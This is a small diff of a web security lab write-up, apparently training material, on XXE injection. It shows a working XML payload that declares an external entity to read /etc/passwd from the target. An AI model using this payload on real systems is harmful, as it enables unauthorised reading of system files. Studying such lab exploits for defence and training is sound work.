@@ -1,8 +1,8 @@
-Lab 1 - Exploiting XXE using external entities to retrieve files
+<!-- Lab 1 - Exploiting XXE using external entities to retrieve files
 
 Target Goal - Exploit XXE injection to retrieve the contents of the /etc/passwd file.
 
-Solution:
+Solution: -->
 
 <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
